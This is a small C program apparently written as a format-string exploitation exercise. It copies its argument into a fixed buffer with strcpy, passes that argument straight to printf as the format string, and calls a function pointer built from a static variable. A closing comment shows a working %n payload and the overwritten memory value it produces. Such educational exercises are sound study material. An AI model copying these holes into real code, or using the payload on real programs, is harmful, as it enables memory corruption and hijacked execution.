/*
 * =====================================================================================
 *
 *       Filename:  exploitable.c
 *
 *        Version:  1.0
 *        Created:  09/27/2015 12:32:05 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Taishi Nojima (tn246), taishi.nojima@yale.edu
 *
 * =====================================================================================
 */
#include    <stdio.h>
#include    <stdlib.h>
#include    <assert.h>
#include	<string.h>

int main (int argc, char **argv){
	char msg[1024];
	static int test_value = -72, next_value = 0x11111111;

	strcpy(msg, argv[1]);

	printf(msg);
	printf("\n");

	printf("[DEBUG] test_value @ 0x%08x = %d 0x%08x\n", (int)&test_value, test_value, test_value );
	printf("[DEBUG] next_value @ 0x%08x = %d 0x%08x\n", (int)&next_value, next_value, next_value );
	int (*ret)() = (int(*)())next_value;
	ret();
		return 0;
}

/*
 * canopus@canopus:~/blackhat_python/pwn/format_str|master⚡
 * ⇒  ./exploitable $(printf "\x2c\xa0\x04\x08JUNK\x2d\xa0\x04\x08JUNK\x2e\xa0\x04\x08JUNK\x2f\xa0\x04\x08")%x%x%x%x%x%x%x%x%x%108x%n%17x%n%17x%n%17x%n
 * ,�JUNK-�JUNK.�JUNK/�bffff70e444471a81d4bffff5341a81d48                                                                                                          4c         4b4e554a         4b4e554a         4b4e554a
 * [DEBUG] test_value @ 0x0804a02c = -573785174 0xddccbbaa
 * ])
 */
